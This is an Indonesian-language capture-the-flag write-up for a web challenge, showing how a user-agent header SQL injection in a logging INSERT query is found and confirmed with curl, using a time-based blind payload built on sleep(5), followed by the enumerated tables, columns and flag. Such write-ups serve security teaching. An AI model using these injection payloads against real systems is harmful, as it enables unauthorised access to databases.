# __ASGama CTF__ 
## _Doge Doge WoW_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Web | 200 | l0l

**Description:** 

> http://ctf.asgama.web.id:45001/
>

### Doge Doge WoW
Tidak ada clue tentang apa soal ini, jadi lakukan sedikit recon.

Tampilan awal web  
![main](./main.png)

Ketika dicek source codenya ada sebuah komentar:
```html
<!-- Dear admin, setiap reload exec query: INSERT into log (uagent) values ('$useragent')  -->
```

Jadi sepertinya terdapat celah SQL Injection dengan inject pada user agent. Maka kita coba lakukan test injeksi pada user agent  
`curl -vA "'" http://ctf.asgama.web.id:45001/`

Hasilnya:  
```html
<b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''')' at line 1 in /checkflag/index.php:20
```

Benar bahwa ada celah SQL Injection di sini. Sekarang permasalahannya adalah bagaimana memanfaatkan celah ini sementara tidak ada text yang diprint. Blind SQLi.

Query yang dijalankan adalah sebagai berikut  
```sql
INSERT into log (uagent) values ('$useragent')
```

Dengan asumsi tidak ada filter, saya coba inject string :  
```sql
'+(select sleep(5))+'
```

Sehingga query menjadi  
```sql
INSERT into log (uagent) values (''+(select sleep(5))+'')
```

Request :  
`curl -vA "'+(select sleep(5))+'" http://ctf.asgama.web.id:45001/`  
Setelah submit request, benar saja terjadi delai cukup lama. Berarti service ini vulnerable terhadap Time Based Blind SQL Injection.

Selebihnya tinggal susun payload.

1. Cari nama table  
2. Cari nama kolom  
3. Isi kolom


### Payload
[solve.py](./solve.py)

### Result
```
Finding table name
bendera,log
Found Table Name : bendera,log

Masukkan nama tabel : bendera
Finding column name in bendera
id,flag
Found Column Name : id,flag

Masukkan nama column : flag
CadosCTF{Header_SQL_Injection}
Found : CadosCTF{Header_SQL_Injection}
```

### Flag
CadosCTF{Header_SQL_Injection}